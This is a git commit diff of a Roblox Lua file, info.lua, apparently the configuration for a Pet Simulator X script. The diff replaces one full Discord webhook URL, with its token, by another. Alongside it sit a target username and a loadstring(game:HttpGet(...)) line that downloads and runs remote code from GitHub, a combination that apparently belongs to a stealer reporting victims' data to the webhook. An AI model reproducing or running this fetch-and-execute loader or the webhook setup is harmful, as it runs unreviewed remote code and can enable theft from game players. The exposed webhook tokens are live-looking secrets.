a95b47556824e69980c0e5043598901828740dfb
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-09 17:51:25 +0200

    Update info.lua

--- info.lua
+++ info.lua
@@ -1,4 +1,4 @@
 UserName = "dawidparuw"
-WebHook = "https://discord.com/api/webhooks/1050637003584192532/y1jOLqGStPfD21BAh9hM2j9LpLdnsbZqgUGy6dWE_l4LpatOmdconNHPaSROX6eBh8Eq"
+WebHook = "https://discord.com/api/webhooks/1050801826158616597/sSXvnPpnt0-VBF6r4GqV5hgJqljh1IkUCst93VRhpP7BpeB_Na1EOD3ATCuutblH0tir"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info1.lua", true))()
